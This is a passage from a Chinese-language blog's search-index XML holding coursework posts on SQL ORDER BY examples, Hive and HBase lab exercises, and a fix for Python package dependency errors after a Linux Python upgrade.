align="left">OrderNumber</th></tr></thead><tbody><tr><td align="left">Apple</td><td align="left">4698</td></tr><tr><td align="left">IBM</td><td align="left">3532</td></tr><tr><td align="left">W3School</td><td align="left">2356</td></tr><tr><td align="left">W3School</td><td align="left">6953</td></tr></tbody></table><h4 id="实例-3"><a href="#实例-3" class="headerlink" title="实例 3"></a>实例 3</h4><p>以逆字母顺序显示公司名称：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> Company, OrderNumber <span class="hljs-keyword">FROM</span> Orders <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> Company <span class="hljs-keyword">DESC</span></code></pre></div><p>结果：</p><table><thead><tr><th align="left">Company</th><th align="left">OrderNumber</th></tr></thead><tbody><tr><td align="left">W3School</td><td align="left">6953</td></tr><tr><td align="left">W3School</td><td align="left">2356</td></tr><tr><td align="left">IBM</td><td align="left">3532</td></tr><tr><td align="left">Apple</td><td align="left">4698</td></tr></tbody></table><h4 id="实例-4"><a href="#实例-4" class="headerlink" title="实例 4"></a>实例 4</h4><p>以逆字母顺序显示公司名称，并以数字顺序显示顺序号：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> Company, OrderNumber <span class="hljs-keyword">FROM</span> Orders <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> Company <span class="hljs-keyword">DESC</span>, OrderNumber <span class="hljs-keyword">ASC</span></code></pre></div><p>结果：</p><table><thead><tr><th align="left">Company</th><th align="left">OrderNumber</th></tr></thead><tbody><tr><td align="left">W3School</td><td align="left">2356</td></tr><tr><td align="left">W3School</td><td align="left">6953</td></tr><tr><td align="left">IBM</td><td align="left">3532</td></tr><tr><td align="left">Apple</td><td align="left">4698</td></tr></tbody></table><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.w3school.com.cn/" target="_blank" rel="noopener">W3school</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hive上机实验</title>
      <link href="/2020/06/19/Hive%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
      <url>/2020/06/19/Hive%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p> hive课程实验</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>该文为Hadoop基础实验中的hive实验</p><h2 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h2><p>掌握hive的编程技术</p><h2 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h2><p>1、创建数据库stu。</p><p>2、创建students表，表结构如下：</p><p>id         int,</p><p>name       string,</p><p>gender      string,</p><p>age         int,</p><p>course_id    int,</p><p>score      double,</p><p>classes      string</p><p>3、导入数据students_data.txt到students表。</p><p>4、创建course表，表结构如下：</p><p>course_id       int,</p><p>course_name    string</p><p>5、导入数据course.txt到course表。</p><p>6、创建动态分区表students_dynamic，以classes为分区字段。</p><p>7、从students表导入数据到students_dynamic。</p><p>8、查询每个班的平均分数。</p><p>9、查询students表中所有学生的姓名、分数。</p><p>10、查询students表中成绩在80至90之间的记录的所有信息。</p><p>11、查询students表中成绩在60以下的记录的姓名、课程编号（course_id）和分数。</p><p>12、将students表中的所有记录先按分数降序，当分数一样时，再按姓名升序排列。</p><p>13、统计students表中有多少门不同的课程。</p><p>14、查询Mary所选修课程的课程编号和分数。</p><p>15、找出所有学生中，course_id为30的课程，分数最高的同学。输出该同学姓名、分数、课程名称、所在班级到屏幕。</p><h2 id="实验方案"><a href="#实验方案" class="headerlink" title="实验方案"></a>实验方案</h2><p>打开hive( 在hadoop根目录执行)</p><div class="hljs code-wrapper"><pre><code class="hljs shell">start-dfs.sh</code></pre></div><p>该语句为打开hdfs分布式文件系统，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image002.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>start-yarn.sh</p><p>该语句为打开资源调度框架yarn，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image004.png" srcset="/img/loading.gif" lazyload="" alt="img"></p><div class="hljs code-wrapper"><pre><code class="hljs shell">service mysqld start</code></pre></div><p>该语句为打开mysql数据库，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image006.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><div class="hljs code-wrapper"><pre><code class="hljs shell">hive</code></pre></div><p>该语句为打开hive，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image008.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>由于hive是部署在hdfs上的组件，故打开hive之前要打开hdfs和yarn框架来调度资源，而hive产生的元数据存储在mysql中，故打开hdfs和yarn之后，且在打开hive之前要打开mysql。</p><p>1.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> stu;</code></pre></div><p>该语句为创建名为stu的数据库，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image010.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>2.</p><div class="hljs code-wrapper"><pre><code class="hljs shell">use stu;</code></pre></div><p>该语句为使用数据库stu，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image012.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> students(<span class="hljs-keyword">id</span> <span class="hljs-built_in">int</span>,<span class="hljs-keyword">name</span> <span class="hljs-keyword">string</span>,gender <span class="hljs-keyword">string</span>,age <span class="hljs-built_in">int</span>,course_id <span class="hljs-built_in">int</span>,score <span class="hljs-keyword">double</span>,classes <span class="hljs-keyword">string</span>) <span class="hljs-keyword">row</span> <span class="hljs-keyword">format</span> <span class="hljs-keyword">delimited</span> <span class="hljs-keyword">fields</span> <span class="hljs-keyword">terminated</span> <span class="hljs-keyword">by</span> <span class="hljs-string">','</span>;</code></pre></div><p>创建名为students的表格，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image014.png" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>3.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">load</span> <span class="hljs-keyword">data</span> <span class="hljs-keyword">local</span> inpath <span class="hljs-string">'/simple/data/students_data.txt'</span> overwrite <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> students;</code></pre></div><p>从本地加载数据到表students中，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image016.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>4.</p><div class="hljs code-wrapper"><pre><code class="hljs sql">hive&gt; create table course(course_id int,course_name string) row format delimited fields terminated by ',';</code></pre></div><p>创建名为course的表，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image018.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>5.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">load</span> <span class="hljs-keyword">data</span> <span class="hljs-keyword">local</span> inpath <span class="hljs-string">'/simple/data/course.txt'</span> overwrite <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> course;</code></pre></div><p>从本地加载数据到表course中，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image020.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>6.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> hive.exec.dynamic.partition=<span class="hljs-literal">true</span>;<span class="hljs-keyword">set</span> hive.exec.dynamic.partition.mode=nostrict;</code></pre></div><p>创建动态分区表之前要先开启分区，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image022.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> students_dynamic(<span class="hljs-keyword">id</span> <span class="hljs-built_in">int</span>,<span class="hljs-keyword">name</span> <span class="hljs-keyword">string</span>,gender <span class="hljs-keyword">string</span>,age <span class="hljs-built_in">int</span>,course_id <span class="hljs-built_in">int</span>,score <span class="hljs-keyword">double</span>,classes <span class="hljs-keyword">string</span>) partitioned <span class="hljs-keyword">by</span>(<span class="hljs-keyword">class</span> <span class="hljs-keyword">string</span>) <span class="hljs-keyword">row</span> <span class="hljs-keyword">format</span> <span class="hljs-keyword">delimited</span> <span class="hljs-keyword">fields</span> <span class="hljs-keyword">terminated</span> <span class="hljs-keyword">by</span> <span class="hljs-string">','</span>;</code></pre></div><p>创建动态分区表，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image024.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>7．</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> overwrite <span class="hljs-keyword">table</span> students_dynamic <span class="hljs-keyword">partition</span>(<span class="hljs-keyword">class</span>=<span class="hljs-string">'classA'</span>)<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> students;</code></pre></div><p>在数据库stu中动态分区表students_dynamic中插入表students的数据，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image026.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image028.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>8.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> classes,<span class="hljs-keyword">avg</span>(score) <span class="hljs-keyword">from</span> students <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> classes;</code></pre></div><p>查询每个班的平均分数，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image030.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image032.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>9.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">name</span>,score <span class="hljs-keyword">from</span> students;</code></pre></div><p>查询students表中所有学生的姓名、分数，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image034.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>10.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> score&gt;=<span class="hljs-number">80</span> <span class="hljs-keyword">and</span> score&lt;=<span class="hljs-number">90</span>;</code></pre></div><p>查询students表中成绩在80至90之间的记录的所有信息，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image036.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>11.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">name</span>,course_id,score <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> score&lt;<span class="hljs-number">60</span>;</code></pre></div><p>查询students表中成绩在60以下的记录的姓名、课程编号（course_id）和分数，查询结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image038.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>12.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> students <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> score <span class="hljs-keyword">desc</span>,<span class="hljs-keyword">name</span> <span class="hljs-keyword">asc</span>;</code></pre></div><p>将students表中的所有记录先按分数降序，当分数一样时，再按姓名升序排列，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image040.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image042.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>13.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(<span class="hljs-keyword">distinct</span> course_id) <span class="hljs-keyword">from</span> students;</code></pre></div><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image044.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image046.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>14.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> course_id,score <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> <span class="hljs-keyword">name</span>==<span class="hljs-string">'Mary'</span>;</code></pre></div><p>查询Mary所选修课程的课程编号和分数，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image048.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>15.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">name</span>,score,course_id,classes <span class="hljs-keyword">from</span> students a,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">max</span>(score) max_score <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> course_id=<span class="hljs-number">30</span>) b <span class="hljs-keyword">where</span> a.score=b.max_score <span class="hljs-keyword">and</span> course_id=<span class="hljs-number">30</span>;</code></pre></div><p>找出所有学生中，course_id为30的课程，分数最高的同学。输出该同学姓名、分数、 课程名称、所在班级到屏幕，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image050.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hive </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux版python升级依赖项问题</title>
      <link href="/2020/06/15/linux%E7%89%88python%E5%8D%87%E7%BA%A7%E4%BE%9D%E8%B5%96%E9%A1%B9%E9%97%AE%E9%A2%98/"/>
      <url>/2020/06/15/linux%E7%89%88python%E5%8D%87%E7%BA%A7%E4%BE%9D%E8%B5%96%E9%A1%B9%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>大坑</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>linux中python2升级到python3，会出现一系列的依赖项未配置问题，如果不解决，将会影响其他环境的安装配置。 </p><p>比如python2升级到3之后，安装docker就会出现(<strong>大量文字高能警告，可以忽略跳到后面</strong>)</p><p><code>正在读取软件包列表... 完成正在分析软件包的依赖关系树       正在读取状态信息... 完成       python-pkg-resources 已经是最新版 (33.1.1-1)。python-pkg-resources 已设置为手动安装。升级了 0 个软件包，新安装了 0 个软件包，要卸载 0 个软件包，有 1 个软件包未被升级。有 15 个软件包没有被完全安装或卸载。解压缩后会消耗 0 B 的额外空间。您希望继续执行吗？ [Y/n] y正在设置 python-idna (2.2-1) .../var/lib/dpkg/info/python-idna.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-idna (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126正在设置 python-pyasn1 (0.1.9-2) .../var/lib/dpkg/info/python-pyasn1.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-pyasn1 (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126正在设置 python-wheel (0.29.0-2) .../var/lib/dpkg/info/python-wheel.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-wheel (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126正在设置 python-pkg-resources (33.1.1-1) .../var/lib/dpkg/info/python-pkg-resources.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-pkg-resources (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126正在设置 python-keyrings.alt (1.3-1) .../var/lib/dpkg/info/python-keyrings.alt.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-keyrings.alt (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126正在设置 python-six (1.10.0-3) .../var/lib/dpkg/info/python-six.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-six (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126正在设置 python-enum34 (1.1.6-1) .../var/lib/dpkg/info/python-enum34.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-enum34 (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126dpkg: 依赖关系问题使得 python-cryptography 的配置工作不能继续： python-cryptography 依赖于 python-enum34；然而：  软件包 python-enum34 尚未配置。 python-cryptography 依赖于 python-idna (&gt;= 2.0)；然而：  软件包 python-idna 尚未配置。 python-cryptography 依赖于 python-pyasn1 (&gt;= 0.1.8)；然而：  软件包 python-pyasn1 尚未配置。 python-cryptograp</code></p><h4 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h4><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo apt-get cleansudo apt-get updatesudo apt-get install --reinstall python-minimal python-lockfile</code></pre></div><p>(某些情况下只执行最后一行命令也许)</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/slvayf/article/details/84336327" target="_blank" rel="noopener">Ubuntu下报错：处理软件包 python-dnspython (–configure)时出错 解决方法</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HBase上机实验</title>
      <link href="/2020/06/05/HBase%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
      <url>/2020/06/05/HBase%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>Hadoop课程的HBase的应用实验</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>该文为Hadoop课程的HBase的应用实验</p><h2 id="实验题目"><a href="#实验题目" class="headerlink" title="实验题目"></a>实验题目</h2><p>Hbase的应用   </p><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>1、掌握Hbase shell操作。</p><p>2、掌握Hbase API编程。</p><h3 id="实验要求："><a href="#实验要求：" class="headerlink" title="实验要求："></a>实验要求：</h3><p>  用Hbase shell操作 ，调用API创建一个student表，其结构如下表所示</p><table><thead><tr><th><strong>Row Key</strong></th><th><strong>address</strong></th><th><strong>score</strong></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>province</strong></td><td><strong>city</strong></td><td><strong>street</strong></td><td><strong>Java</strong></td><td><strong>Hadoop</strong></td><td><strong>Math</strong></td><td></td></tr><tr><td><strong>zhangsan</strong></td><td><strong>guangdong</strong></td><td><strong>guangzhou</strong></td><td><strong>yinglonglu</strong></td><td><strong>85</strong></td><td><strong>80</strong></td><td><strong>90</strong></td></tr><tr><td><strong>lisi</strong></td><td><strong>guangxi</strong></td><td><strong>guilin</strong></td><td><strong>putuolu</strong></td><td><strong>87</strong></td><td><strong>82</strong></td><td><strong>78</strong></td></tr></tbody></table><p>查询zhangsan的地址（address）</p><p>查询 lisi 的Hadoop成绩。</p><p>二、   实验方案</p><p>（主要写Hbase shell命令 和 运用API 编写的程序及运行结果，此语句要删除）</p><p>1， 创建表student有两个列族address和score</p><div class="hljs code-wrapper"><pre><code class="hljs pgsql">hbase(main):<span class="hljs-number">041</span>:<span class="hljs-number">0</span>&gt; creat<span class="hljs-string">e'student'</span>, {<span class="hljs-type">NAME</span>=&gt;<span class="hljs-string">'address'</span>}, {<span class="hljs-type">NAME</span>=&gt;<span class="hljs-string">'score'</span>}</code></pre></div><p>2， 向表中添加数据，</p><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">hbase</span><span class="hljs-params">(main)</span></span>:<span class="hljs-number">042</span>:<span class="hljs-number">0</span>&gt;put<span class="hljs-string">'student'</span>,<span class="hljs-string">'zhangsan'</span>,<span class="hljs-string">'address:province'</span>,<span class="hljs-string">'guangdon'</span><span class="hljs-function"><span class="hljs-title">hbase</span><span class="hljs-params">(main)</span></span>:<span class="hljs-number">043</span>:<span class="hljs-number">0</span>&gt;put<span class="hljs-string">'student'</span>, <span class="hljs-string">'zhangsan'</span>,<span class="hljs-string">'address:city'</span>,<span class="hljs-string">'guangzhou'</span><span class="hljs-function"><span class="hljs-title">hbase</span><span class="hljs-params">(main)</span></span>:<span class="hljs-number">044</span>:<span class="hljs-number">0</span>&gt;put<span class="hljs-string">'student'</span>,<span class="hljs-string">'zhangsan'</span>,<span class="hljs-string">'address:street'</span>,<span class="hljs-string">'yinglonglu'</span><span class="hljs-function"><span class="hljs-title">hbase</span><span class="hljs-params">(main)</span></span>:<span class="hljs-number">045</span>:<span class="hljs-number">0</span>&gt;put<span class="hljs-string">'student'</span>,<span class="hljs-string">'zhangsan'</span>,<span class="hljs-string">'score:Java'</span>,<span class="hljs-string">'85'</span> hbase(main):<span class="hljs-number">046</span>:<span class="hljs-number">0</span>&gt;put<span class="hljs-string">'student'</span>,<span class="hljs-string">'zhangsan'</span>,<span class="hljs-string">'score:Hadoop'</span>,<span class="hljs-string">'80'</span><span class="hljs-function"><span class="hljs-title">hbase</span><span class="hljs-params">(main)</span></span>:<span class="hljs-number">047</span>:<span class="hljs-number">0</span>&gt;put<span class="hljs-string">'student'</span>, <span class="hljs-string">'zhangsan'</span>,<span class="hljs-string">'score:Math'</span>,<span class="hljs-string">'90'</span><span class="hljs-function"><span class="hljs-title">hbase</span><span class="hljs-params">(main)</span></span>:<span class="hljs-number">048</span>:<span class="hljs-number">0</span>&gt;put<span class="hljs-string">'student'</span>, <span class="hljs-string">'lisi'</span>,<span class="hljs-string">'address:province'</span>,<span class="hljs-string">'guangxi'</span><span class="hljs-function"><span class="hljs-title">hbase</span><span class="hljs-params">(main)</span></span>:<span class="hljs-number">049</span>:<span class="hljs-number">0</span>&gt;put<span class="hljs-string">'student'</span>, <span class="hljs-string">'lisi'</span>,<span class="hljs-string">'address:city'</span>,<span class="hljs-string">'guilin'</span><span class="hljs-function"><span class="hljs-title">hbase</span><span class="hljs-params">(main)</span></span>:<span class="hljs-number">050</span>:<span class="hljs-number">0</span>&gt;put<span class="hljs-string">'student'</span>,<span class="hljs-string">'lisi'</span>,<span class="hljs-string">'address:street'</span>,<span class="hljs-string">'putuolu'</span><span class="hljs-function"><span class="hljs-title">hbase</span><span class="hljs-params">(main)</span></span>:<span class="hljs-number">051</span>:<span class="hljs-number">0</span>&gt;put<span class="hljs-string">'student'</span>,<span class="hljs-string">'lisi'</span>,<span class="hljs-string">'score:Java'</span>,<span class="hljs-string">'87'</span><span class="hljs-function"><span class="hljs-title">hbase</span><span class="hljs-params">(main)</span></span>:<span class="hljs-number">052</span>:<span class="hljs-number">0</span>&gt;put<span class="hljs-string">'student'</span>,<span class="hljs-string">'lisi'</span>,<span class="hljs-string">'score:Hadoop'</span>,<span class="hljs-string">'82'</span><span class="hljs-number">53</span>hbase(main):<span class="hljs-number">053</span>:<span class="hljs-number">0</span>&gt;put<span class="hljs-string">'student'</span>,<span class="hljs-string">'lisi'</span>,<span class="hljs-string">'score:Math'</span>,<span class="hljs-string">'78'</span></code></pre></div><ol start="3"><li>查询“zhangsan”的地址（address）</li></ol><div class="hljs code-wrapper"><pre><code class="hljs routeros">hbase(main):054:0&gt; get<span class="hljs-string">'student'</span>,<span class="hljs-string">'zhangsan'</span>,’address’ COLUMN          CELL                                  \1.  adress:province       <span class="hljs-attribute">timestamp</span>=1478053832459, <span class="hljs-attribute">value</span>=guangdong                   \2.  adress:city        <span class="hljs-attribute">timestamp</span>=1478053787178, <span class="hljs-attribute">value</span>=guangzhou  \3.    adress:street       <span class="hljs-attribute">timestamp</span>=1478053764968, <span class="hljs-attribute">value</span>=yinglonglu</code></pre></div><p> 4.查询“lisi”的“Hadoop”成绩</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml">hbase(main):<span class="hljs-number">055</span>:<span class="hljs-number">0</span>&gt; get'student<span class="hljs-character">','</span>lisi',’ 'score:Hadoop'’ <span class="hljs-comment">//创建表描述对象</span>​    HTableDescriptor TableDescriptor = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HTableDescriptor(<span class="hljs-params">tableName</span>)</span>;   <span class="hljs-comment">//通过表描述对象，添加列簇</span>   hTableDescriptor columnDesc1=<span class="hljs-keyword">new</span> <span class="hljs-constructor">HColumnDescriptor(<span class="hljs-string">"address "</span>)</span>;hTableDescriptor columnDesc1=<span class="hljs-keyword">new</span> <span class="hljs-constructor">HColumnDescriptor(<span class="hljs-string">"score"</span>)</span>;   <span class="hljs-comment">//通过admin创建表，需要传入表描述对象</span>   admin.create<span class="hljs-constructor">Table(<span class="hljs-params">hTableDescriptor</span>)</span>;   <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">"创建表"</span>); public void init<span class="hljs-constructor">Connection()</span> {  <span class="hljs-keyword">try</span>{   connection = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConnectionFactory</span>.</span></span>create<span class="hljs-constructor">Connection(<span class="hljs-params">config</span>)</span>;  } catch (IOException e) {   <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">"连接数据库"</span>);  }}public void put<span class="hljs-literal">()</span> throws IOException {  <span class="hljs-comment">//1. 定义表的名称</span>  TableName tableName = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TableName</span>.</span></span>value<span class="hljs-constructor">Of(<span class="hljs-string">"student"</span>)</span>;    <span class="hljs-comment">//2. 获取表对象</span>  Table table = connection.get<span class="hljs-constructor">Table(<span class="hljs-params">tableName</span>)</span>;   <span class="hljs-comment">//3. 准备数据</span>  String rowkey = <span class="hljs-string">"rowkey_zhangsan"</span>;  Put put= <span class="hljs-keyword">new</span> <span class="hljs-constructor">Put(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-params">rowKey</span>)</span>);​    put.add<span class="hljs-constructor">Column(Bytes.<span class="hljs-params">toBytes</span>(<span class="hljs-string">"address"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"province"</span>)</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bytes</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">"guangdong"</span>)</span>);​    put.add<span 